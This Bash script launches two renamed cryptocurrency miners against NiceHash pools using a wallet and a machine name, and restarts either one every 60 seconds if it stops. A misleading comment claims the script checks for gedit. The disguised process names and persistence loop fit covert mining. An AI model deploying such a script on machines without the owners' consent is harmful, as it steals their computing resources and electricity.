#!/bin/bash
# Verifica se o gedit está sendo executado
NOMEMAQUINA="$2";
CARTEIRA="$1"
./xtreta --donate-level 1 -o randomxmonero.eu.nicehash.com:3380 -u $CARTEIRA.$NOMEMAQUINA -p x -k -a rx/0 &
sleep 1;
./ntreta -a ethash  -log -o stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 -u $CARTEIRA.$NOMEMAQUINA &

while true; do
	sleep 60;
	clear
	NOMEMAQUINA="$2";
	CARTEIRA="$1"
	if pgrep "xtreta" > /dev/null
	then
		echo "Executando - xtreta" $NOMEMAQUINA;
	else
		echo "Parado - xtreta";
		./xtreta --donate-level 1 -o randomxmonero.eu.nicehash.com:3380 -u $CARTEIRA.$NOMEMAQUINA -p x -k -a rx/0 &
	fi

	if pgrep "ntreta" > /dev/null
	then
		echo "Executando - ntreta" $NOMEMAQUINA;
	else
		echo "Parado - ntreta";
		./ntreta -a ethash  -log -o stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 -u $CARTEIRA.$NOMEMAQUINA &
	fi	

done